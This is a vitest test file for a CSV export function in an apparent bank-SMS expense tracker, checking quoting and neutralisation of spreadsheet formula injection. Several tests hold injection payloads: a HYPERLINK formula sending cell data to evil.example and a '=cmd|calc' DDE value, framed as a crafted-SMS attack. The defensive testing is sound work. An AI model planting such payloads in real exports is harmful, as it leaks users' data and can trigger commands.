import { parseBankMessage } from '@bukit/parsers';
import { describe, expect, it } from 'vitest';
import { buildCsv, csvField, csvText, type CsvTransaction } from '@/lib/csv';

const fmt = { day: () => '2026-07-31', time: () => '17:37' };

function tx(overrides: Partial<CsvTransaction> = {}): CsvTransaction {
  return {
    occurred_at: '2026-07-31T09:37:00.000Z',
    amount: 21,
    currency: 'BND',
    merchant: 'GALORIES SMOOTHIES BSB BN',
    category_id: null,
    bank: 'baiduri',
    card_last4: '0213',
    source: 'ios_shortcut',
    parse_status: 'parsed',
    notes: null,
    raw_text: 'Card No.: 4x0213 Amount: BND 21.00',
    ...overrides,
  };
}

function cells(csv: string): string[][] {
  return csv.trimEnd().split('\r\n').map((line) => line.split(','));
}

describe('csvField — RFC 4180 quoting', () => {
  it('leaves an ordinary value alone', () => {
    expect(csvField('HUA HO MANGGIS')).toBe('HUA HO MANGGIS');
  });

  it('quotes commas, quotes and newlines, doubling embedded quotes', () => {
    expect(csvField('SYARIKAT ABC, BHD')).toBe('"SYARIKAT ABC, BHD"');
    expect(csvField('SAY "HI"')).toBe('"SAY ""HI"""');
    expect(csvField('line1\nline2')).toBe('"line1\nline2"');
  });

  it('renders null and undefined as empty', () => {
    expect(csvField(null)).toBe('');
    expect(csvField(undefined)).toBe('');
  });

  // The reason csvField and csvText are separate functions: an incoming
  // transaction is a negative amount, and neutralising it would turn every
  // sum in the exported sheet into text.
  it('does NOT neutralise a negative number', () => {
    expect(csvField('-12.50')).toBe('-12.50');
  });
});

describe('csvText — formula neutralisation', () => {
  // A spreadsheet treats these as formulas whether or not the field is quoted,
  // so quoting is not the control here.
  it.each([
    ['=', '=HYPERLINK("http://evil.example/"&A2,"Receipt")'],
    ['+', '+1+1'],
    ['-', '-2+3'],
    ['@', '@SUM(A1:A9)'],
    ['tab', '\tcmd'],
    ['CR', '\rcmd'],
  ])('prefixes a leading %s with an apostrophe', (_label, value) => {
    expect(csvText(value).replace(/^"|"$/g, '')).toMatch(/^'/);
  });

  it('sees through leading whitespace a spreadsheet would trim', () => {
    expect(csvText('   =1+1')).toBe("'   =1+1");
  });

  it('leaves an ordinary merchant untouched', () => {
    expect(csvText('GALORIES SMOOTHIES BSB BN')).toBe('GALORIES SMOOTHIES BSB BN');
    expect(csvText('HUA HO')).toBe('HUA HO');
  });

  it('still quotes as well as neutralises', () => {
    expect(csvText('=A1,B2')).toBe('"\'=A1,B2"');
  });

  it('does not fire on a formula character that is not leading', () => {
    expect(csvText('KFC GADONG =OK')).toBe('KFC GADONG =OK');
  });
});

describe('buildCsv', () => {
  it('writes the header and one row per transaction', () => {
    const csv = buildCsv([tx(), tx()], new Map(), fmt);
    const rows = cells(csv);
    expect(rows[0]![0]).toBe('date');
    expect(rows).toHaveLength(3);
    expect(csv.endsWith('\r\n')).toBe(true);
  });

  /**
   * The end-to-end property. The capture automation fires on any message
   * matching a bank's format regardless of sender, so `merchant` and
   * `raw_text` carry whatever an attacker who knows the phone number sent.
   * Neither may reach the file as a live formula.
   */
  it('neutralises a formula arriving from a crafted bank SMS', () => {
    const payload = '=HYPERLINK("http://evil.example/"&A2,"Receipt")';
    const csv = buildCsv(
      [tx({ merchant: payload, raw_text: `Card No.: 4x0213 Merchant: ${payload}` })],
      new Map(),
      fmt,
    );
    // No cell may begin with a formula trigger, quoted or not.
    for (const row of cells(csv).slice(1)) {
      for (const cell of row) {
        expect(cell.replace(/^"/, '')).not.toMatch(/^[=+\-@\t\r]/);
      }
    }
    expect(csv).toContain("'=HYPERLINK");
  });

  it('neutralises a category name and a note the user typed', () => {
    const csv = buildCsv(
      [tx({ category_id: 'cat-1', notes: '@SUM(A1:A9)' })],
      new Map([['cat-1', '=cmd|calc']]),
      fmt,
    );
    expect(csv).toContain("'=cmd|calc");
    expect(csv).toContain("'@SUM(A1:A9)");
  });

  // Regression guard for the split: the amount column must stay numeric.
  it('keeps a negative amount numeric', () => {
    const csv = buildCsv([tx({ amount: -12.5 })], new Map(), fmt);
    expect(cells(csv)[1]![2]).toBe('-12.50');
  });

  /**
   * The whole chain, with no hand-written intermediate: a message of the shape
   * anyone can send to a user's phone, through the real parser, into the file.
   * Written this way on purpose — asserting on a merchant string typed into
   * this test would keep passing if the parser ever stopped extracting what an
   * attacker actually controls.
   */
  it('a crafted SMS cannot reach the file as a live formula', () => {
    const payload = '=HYPERLINK("http://evil.example/"&A2,"Receipt")';
    const sms =
      `Card No.: 4x0213 Amount: BND 1.00 Merchant: ${payload} ` +
      'Date: 31-07-2026 09:15:00 If suspicious, please call 2449666.';

    const { tx: parsed } = parseBankMessage(sms);
    // Guard the premise: if this ever stops holding, the test below is vacuous.
    expect(parsed?.merchant).toBe(payload);

    const csv = buildCsv(
      [tx({ merchant: parsed!.merchant, raw_text: sms })],
      new Map(),
      fmt,
    );

    for (const cell of cells(csv)[1]!) {
      expect(cell.replace(/^"/, '')).not.toMatch(/^[=+\-@\t\r]/);
    }
    expect(csv).toContain("'=HYPERLINK");
  });

  it('renders a missing date, amount and note as empty cells', () => {
    const csv = buildCsv(
      [tx({ occurred_at: null, amount: null, merchant: null, notes: null })],
      new Map(),
      fmt,
    );
    const row = cells(csv)[1]!;
    expect(row[0]).toBe('');
    expect(row[1]).toBe('');
    expect(row[2]).toBe('');
  });
});
